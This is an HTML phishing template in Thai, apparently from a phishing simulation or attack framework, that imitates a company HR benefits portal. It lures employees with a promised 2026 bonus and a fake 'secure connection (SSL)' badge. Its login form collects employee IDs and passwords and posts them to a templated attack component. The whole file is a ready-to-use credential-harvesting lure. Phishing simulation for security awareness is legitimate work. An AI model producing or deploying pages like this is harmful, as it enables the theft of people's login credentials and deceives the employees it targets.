<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ระบบสวัสดิการพนักงาน {{ attack.target.company }} | HR Portal</title>
  <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@400;500;600;700&display=swap" rel="stylesheet">
</head>
<body style="margin:0; padding:1.5rem; box-sizing:border-box; font-family:'Sarabun', -apple-system, BlinkMacSystemFont, sans-serif; background:linear-gradient(135deg, #134e5e 0%, #2c3e50 50%, #3498db 100%); min-height:100vh; display:flex; justify-content:center; align-items:center; color:#2c3e50;">

  <main style="background:#ffffff; width:100%; max-width:420px; border-radius:14px; box-shadow:0 20px 50px rgba(15, 23, 42, 0.25); overflow:hidden;">

    <header style="background:linear-gradient(135deg, #ff6b6b 0%, #ee5a52 50%, #f06595 100%); color:#ffffff; padding:1.75rem 1.5rem 1.5rem; text-align:center; position:relative; border-bottom:4px solid #ffd93d;">
      <div style="width:64px; height:64px; background:#ffffff; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; font-size:1.5rem; font-weight:800; color:#ee5a52; margin-bottom:0.85rem; box-shadow:0 6px 16px rgba(0, 0, 0, 0.2); letter-spacing:0.5px;">HR</div>
      <h1 style="margin:0 0 0.3rem 0; font-size:1.2rem; font-weight:600; text-shadow:0 1px 2px rgba(0, 0, 0, 0.15);">ระบบสวัสดิการพนักงาน</h1>
      <div style="font-size:0.78rem; color:#fff5f5; letter-spacing:0.3px; opacity:0.95;">{{ attack.target.company }} HR Portal</div>
    </header>

    <div style="background:#fff7ed; border-left:4px solid #f59e0b; color:#92400e; padding:0.75rem 1.5rem; font-size:0.82rem; line-height:1.5;">
      <strong>&#127881; Bonus 2026 พร้อมแล้ว!</strong> เข้าสู่ระบบเพื่อดูรายละเอียดสวัสดิการประจำปี
    </div>

    <section style="padding:1.5rem 1.75rem 1.75rem;">

      <div style="background:#ecf0f1; border-left:3px solid #3498db; padding:0.75rem 1rem; border-radius:6px; font-size:0.85rem; color:#34495e; margin-bottom:1.4rem; line-height:1.55;">
        โปรดเข้าสู่ระบบด้วย <strong>รหัสพนักงาน</strong> และ <strong>รหัสผ่าน</strong>
        เพื่อดูรายละเอียดโบนัสและสวัสดิการประจำปี 2026
      </div>

      <form
        id="hrLoginForm"
        method="post"
        action="{{ attack.scheme.components.first(name='hr_benefits_page').url }}"
        style="margin:0;"
      >
        <div style="margin-bottom:1rem;">
          <label for="employeeId" style="display:block; font-size:0.82rem; font-weight:600; color:#34495e; margin-bottom:0.4rem;">
            รหัสพนักงาน <span style="color:#e74c3c;">*</span>
          </label>
          <input
            type="text"
            id="employeeId"
            name="username"
            placeholder="เช่น EMP-00001"
            autocomplete="username"
            required
            style="width:100%; padding:0.7rem 0.9rem; border:1px solid #dcdfe1; border-radius:8px; font-size:0.95rem; font-family:inherit; color:#2c3e50; background:#f8f9fa; box-sizing:border-box; outline:none;"
            onfocus="this.style.borderColor='#3498db'; this.style.background='#ffffff'; this.style.boxShadow='0 0 0 3px rgba(52, 152, 219, 0.15)';"
            onblur="this.style.borderColor='#dcdfe1'; this.style.background='#f8f9fa'; this.style.boxShadow='none';"
          >
        </div>

        <div style="margin-bottom:1.25rem;">
          <label for="password" style="display:block; font-size:0.82rem; font-weight:600; color:#34495e; margin-bottom:0.4rem;">
            รหัสผ่าน <span style="color:#e74c3c;">*</span>
          </label>
          <input
            type="password"
            id="password"
            name="password"
            placeholder="กรอกรหัสผ่าน"
            autocomplete="current-password"
            required
            style="width:100%; padding:0.7rem 0.9rem; border:1px solid #dcdfe1; border-radius:8px; font-size:0.95rem; font-family:inherit; color:#2c3e50; background:#f8f9fa; box-sizing:border-box; outline:none;"
            onfocus="this.style.borderColor='#3498db'; this.style.background='#ffffff'; this.style.boxShadow='0 0 0 3px rgba(52, 152, 219, 0.15)';"
            onblur="this.style.borderColor='#dcdfe1'; this.style.background='#f8f9fa'; this.style.boxShadow='none';"
          >
        </div>

        <button
          type="submit"
          style="width:100%; padding:0.85rem; background:linear-gradient(135deg, #3498db, #2980b9); color:#ffffff; border:none; border-radius:8px; font-size:0.98rem; font-weight:600; font-family:inherit; cursor:pointer; letter-spacing:0.3px; box-shadow:0 4px 10px rgba(52, 152, 219, 0.3); transition:transform 0.1s;"
          onmouseover="this.style.boxShadow='0 8px 20px rgba(52, 152, 219, 0.45)'; this.style.transform='translateY(-1px)';"
          onmouseout="this.style.boxShadow='0 4px 10px rgba(52, 152, 219, 0.3)'; this.style.transform='translateY(0)';"
        >
          &#127873; ดูโบนัสสวัสดิการปี 2026
        </button>

        <div style="text-align:center; margin-top:1rem;">
          <a href="#" style="font-size:0.8rem; color:#7f8c8d; text-decoration:none;" onmouseover="this.style.color='#3498db'; this.style.textDecoration='underline';" onmouseout="this.style.color='#7f8c8d'; this.style.textDecoration='none';">
            ลืมรหัสผ่าน?
          </a>
        </div>
      </form>
    </section>

    <footer style="background:#f8f9fa; padding:0.9rem 1.75rem; border-top:1px solid #ecf0f1; text-align:center; font-size:0.72rem; color:#7f8c8d; line-height:1.55;">
      <span style="color:#27ae60; font-weight:600;">&#128274; การเชื่อมต่อปลอดภัย (SSL)</span><br>
      &copy; {{ attack.target.company }} HR Department &middot; ติดต่อ <a href="mailto:hr@company.com" style="color:#3498db; text-decoration:none;">hr@company.com</a>
    </footer>

  </main>
</body>
</html>
